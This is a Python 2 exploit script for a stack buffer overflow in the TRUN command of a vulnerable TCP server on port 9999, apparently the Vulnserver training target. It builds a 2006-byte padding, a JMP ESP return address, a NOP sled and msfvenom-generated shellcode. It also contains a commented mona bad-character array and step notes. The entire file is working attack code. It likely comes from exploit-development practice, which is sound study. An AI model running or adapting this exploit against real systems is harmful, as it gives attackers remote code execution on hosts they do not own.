#!/usr/bin/python
import socket

#Modify the IP:PORT as the vulnerable server's IP:PORT
server = '127.0.0.1'
sport = 9999

length = int(raw_input('Length of attack: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack length ", length, ' to TRUN .'
jump_esp= "\xDF\x11\x50\x62" #JMP ESP address
no_op="\x90" * 20  #No-Operation value in Hex
#payload generated using msfvenom
payload = ("\xdd\xc7\xd9\x74\x24\xf4\xba\x38\xfd\xb2\xad\x5f\x2b\xc9\xb1"
"\x52\x31\x57\x17\x83\xef\xfc\x03\x6f\xee\x50\x58\x73\xf8\x17"
"\xa3\x8b\xf9\x77\x2d\x6e\xc8\xb7\x49\xfb\x7b\x08\x19\xa9\x77"
"\xe3\x4f\x59\x03\x81\x47\x6e\xa4\x2c\xbe\x41\x35\x1c\x82\xc0"
"\xb5\x5f\xd7\x22\x87\xaf\x2a\x23\xc0\xd2\xc7\x71\x99\x99\x7a"
"\x65\xae\xd4\x46\x0e\xfc\xf9\xce\xf3\xb5\xf8\xff\xa2\xce\xa2"
"\xdf\x45\x02\xdf\x69\x5d\x47\xda\x20\xd6\xb3\x90\xb2\x3e\x8a"
"\x59\x18\x7f\x22\xa8\x60\xb8\x85\x53\x17\xb0\xf5\xee\x20\x07"
"\x87\x34\xa4\x93\x2f\xbe\x1e\x7f\xd1\x13\xf8\xf4\xdd\xd8\x8e"
"\x52\xc2\xdf\x43\xe9\xfe\x54\x62\x3d\x77\x2e\x41\x99\xd3\xf4"
"\xe8\xb8\xb9\x5b\x14\xda\x61\x03\xb0\x91\x8c\x50\xc9\xf8\xd8"
"\x95\xe0\x02\x19\xb2\x73\x71\x2b\x1d\x28\x1d\x07\xd6\xf6\xda"
"\x68\xcd\x4f\x74\x97\xee\xaf\x5d\x5c\xba\xff\xf5\x75\xc3\x6b"
"\x05\x79\x16\x3b\x55\xd5\xc9\xfc\x05\x95\xb9\x94\x4f\x1a\xe5"
"\x85\x70\xf0\x8e\x2c\x8b\x93\x70\x18\xfc\xe4\x19\x5b\x02\xfa"
"\x0e\xd2\xe4\x96\xa0\xb3\xbf\x0e\x58\x9e\x4b\xae\xa5\x34\x36"
"\xf0\x2e\xbb\xc7\xbf\xc6\xb6\xdb\x28\x27\x8d\x81\xff\x38\x3b"
"\xad\x9c\xab\xa0\x2d\xea\xd7\x7e\x7a\xbb\x26\x77\xee\x51\x10"
"\x21\x0c\xa8\xc4\x0a\x94\x77\x35\x94\x15\xf5\x01\xb2\x05\xc3"
"\x8a\xfe\x71\x9b\xdc\xa8\x2f\x5d\xb7\x1a\x99\x37\x64\xf5\x4d"
"\xc1\x46\xc6\x0b\xce\x82\xb0\xf3\x7f\x7b\x85\x0c\x4f\xeb\x01"
"\x75\xad\x8b\xee\xac\x75\xbb\xa4\xec\xdc\x54\x61\x65\x5d\x39"
"\x92\x50\xa2\x44\x11\x50\x5b\xb3\x09\x11\x5e\xff\x8d\xca\x12"
"\x90\x7b\xec\x81\x91\xa9")

#bytearray generated using mona
#byte_array = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#To find Bad Characters
#attack = 'A' * 2006 + 'B' * 4 + byte_array

#Final Crafted Payload
attack = 'A' * 2006 + jump_esp + no_op + payload #+ 'C' * 400

s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()




